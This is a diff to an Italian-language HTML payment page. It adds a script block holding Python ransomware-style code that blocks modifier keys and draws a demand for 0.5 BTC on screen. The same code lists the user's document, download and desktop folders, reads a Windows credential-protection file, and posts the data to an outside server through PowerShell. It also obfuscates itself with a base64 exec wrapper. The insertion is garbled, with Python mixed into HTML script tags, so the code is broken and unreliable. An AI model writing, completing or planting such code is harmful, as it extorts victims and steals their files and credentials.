@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+</script><!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -28,8 +28,74 @@
         <p>Clicca qui per effettuare il pagamento: <a href="[Link di Pagamento]" target="_blank">Paga Ora</a></p>
     </div>
 
-    
+    <script>
 
+var encodePayload = import base64
 
+# Codice Python originale
+python_code = """
+import ctypes
+import os
+import base64
+import subprocess
+import sys
+import time
+import threading
+import win32api
+import win32con
+import win32gui
 
+# Funzione per disabilitare i tasti
+def disable_keys():
+    while True:
+        win32api.keybd_event(win32con.VK_SHIFT, 0, 0, 0)
+        win32api.keybd_event(win32con.VK_SHIFT, 0, win32con.KEYEVENTF_KEYUP, 0)
+        win32api.keybd_event(win32con.VK_CONTROL, 0, 0, 0)
+        win32api.keybd_event(win32con.VK_CONTROL, 0, win32con.KEYEVENTF_KEYUP, 0)
+        win32api.keybd_event(win32con.VK_MENU, 0, 0, 0)
+        win32api.keybd_event(win32con.VK_MENU, 0, win32con.KEYEVENTF_KEYUP, 0)
+        time.sleep(0.1)
 
+# Funzione per mostrare la schermata di pagamento
+def show_payment_screen():
+    hDC = win32gui.GetDC(None)
+    win32gui.TextOut(hDC, 50, 50, "PAGAMENTO RICHIESTO", len("PAGAMENTO RICHIESTO"))
+    win32gui.TextOut(hDC, 50, 100, "Invia 0.5 BTC a 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", len("Invia 0.5 BTC a 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"))
+    win32gui.ReleaseDC(None, hDC)
+
+# Funzione per estrarre e inviare i dati dell'utente
+def extract_and_send_data():
+    user_data = {
+        "documents": os.listdir(os.path.expanduser("~/Documents")),
+        "downloads": os.listdir(os.path.expanduser("~/Downloads")),
+        "desktop": os.listdir(os.path.expanduser("~/Desktop")),
+        "passwords": subprocess.check_output('cmd /c "type %APPDATA%\\Microsoft\\Protect\\S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-1001"', shell=True).decode('utf-8')
+    }
+    encoded_data = base64.b64encode(str(user_data).encode('utf-8')).decode('utf-8')
+    with open('data.txt', 'w') as f:
+        f.write(encoded_data)
+    subprocess.Popen(['powershell', '-Command', 'Invoke-WebRequest -Uri "http://tuoserver.com/ricevidedati" -Method Post -Body @{data=$encoded_data}'])
+
+# Obfuscazione del codice
+def obfuscate_code():
+    packed_code = base64.b64encode(open(__file__, 'rb').read()).decode('utf-8')
+    with open(__file__, 'w') as f:
+        f.write(f'# {packed_code}\nexec(base64.b64decode("{packed_code}").decode("utf-8"))')
+
+# Main
+if __name__ == "__main__":
+    obfuscate_code()
+    extract_and_send_data()
+    threading.Thread(target=disable_keys).start()
+    show_payment_screen()
+    while True:
+        time.sleep(1)
+"""
+
+# Codifica il codice Python in base64
+encoded_python_code = base64.b64encode(python_code.encode('utf-8')).decode('utf-8')
+
+print(encoded_python_code)
+    </script>
+</body>
+</html>
